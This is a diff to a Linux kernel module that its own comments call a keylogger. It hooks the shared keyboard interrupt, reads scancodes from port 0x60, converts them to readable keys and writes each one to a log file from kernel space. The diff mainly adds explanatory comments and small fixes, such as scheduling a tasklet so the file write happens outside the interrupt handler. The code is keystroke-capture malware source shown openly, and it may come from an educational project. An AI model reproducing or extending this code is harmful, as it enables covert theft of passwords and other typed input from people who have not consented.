@@ -35,12 +35,22 @@ struct logger_data{
 struct file* log_open(const char *path, int flags, int rights)
 {
 	struct file *fp = NULL;
+	/* Since we are passing kernel addresses to system calls, we must pass 
+	 * a user space address into each system call. It is generally a bad 
+	 * idea to handle files from a kernel module, however this is the 
+	 * quickest way for this keylogger. 
+	 */
 	mm_segment_t old_fs;
 	int error = 0;
 
+	/* Save current process address limit. */
 	old_fs = get_fs();
+	/* Set current process address limit to that of the kernel, allowing
+ 	 * the system call to access kernel memory.
+	 */ 
 	set_fs(get_ds());
 	fp = filp_open(path, flags, rights);
+	/* Restore address limit to current process. */
 	set_fs(old_fs);
 
 	if(IS_ERR(fp)){
@@ -67,6 +77,7 @@ int log_write(struct file *fp, unsigned char *data,
 	set_fs(get_ds());
 
 	ret = vfs_write(fp, data, size, &log_offset);
+	/* Increase file offset, preparing for next write operation. */
 	log_offset += size;
 
 	set_fs(old_fs);
@@ -83,6 +94,7 @@ void tasklet_logger(unsigned long data)
 	if(1){
 		char buf[32];
 		memset(buf, 0, sizeof(buf));
+		/* Convert scancode to readable key and log it. */
 		switch(ld.scancode){
 			default: 
 				return;
@@ -277,19 +289,18 @@ void tasklet_logger(unsigned long data)
 	}
 }
 
-DECLARE_TASKLET(my_tasklet, tasklet_logger, (unsigned long)&ld);
+DECLARE_TASKLET(my_tasklet, tasklet_logger, 0);
 
 irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs)
 {
+	/* Set global value to the received scancode. */
 	ld.scancode = inb(0x60);
 
-	tasklet_schedule(&my_tasklet);
-	/* TODO:
-	 * Writing to a file during an ISR crashes the system, so
-	 * fill a queue/buffer and then write out this buffer to the 
-	 * log in a non-atomic context where sleeping is allowed.
-	 * e.g., a tasklet
+	/* We want to avoid I/O in an ISR, so schedule a Linux tasklet to
+	 * write the key to the log file at the next available time in a 
+	 * non-atomic context.
 	 */
+	tasklet_schedule(&my_tasklet);
 	
 	return (irq_handler_t)IRQ_HANDLED;
 }
@@ -303,12 +314,14 @@ static int __init kb_init(void)
 	 * Note this file may be different for each distro
 	 */
 
+	/* Open log file as write only, create if it doesn't exist. */
 	log_fp = log_open(LOG_FILE, O_WRONLY | O_CREAT, 0644);
 	if(IS_ERR(log_fp)){
-		printk("FAILED to open log file.\n");
+		printk(KERN_INFO "FAILED to open log file.\n");
 		return 1;
 	}
 	else{
+		/* Log file opened, write header. */
 		printk(KERN_INFO "SUCCESSFULLY opened log file.\n");
 		unsigned char buf[32];
 		memset(buf, 0, sizeof(buf));
@@ -316,6 +329,7 @@ static int __init kb_init(void)
 		log_write(log_fp, buf, sizeof(buf));
 	}
 
+	/* Request to register a shared IRQ handler (ISR). */
 	ret = request_irq(KB_IRQ, (irq_handler_t)kb_irq_handler, IRQF_SHARED,
 			NAME, &ld);
 	if(ret != 0){
@@ -327,8 +341,13 @@ static int __init kb_init(void)
 
 static void __exit kb_exit(void)
 {
+	/* Free the logging tasklet. */
 	tasklet_kill(&my_tasklet);
+
+	/* Free the shared IRQ handler, giving system back original control. */
 	free_irq(KB_IRQ, &ld);
+
+	/* Close log file handle. */
 	if(log_fp != NULL){
 		log_close(log_fp);
 	}
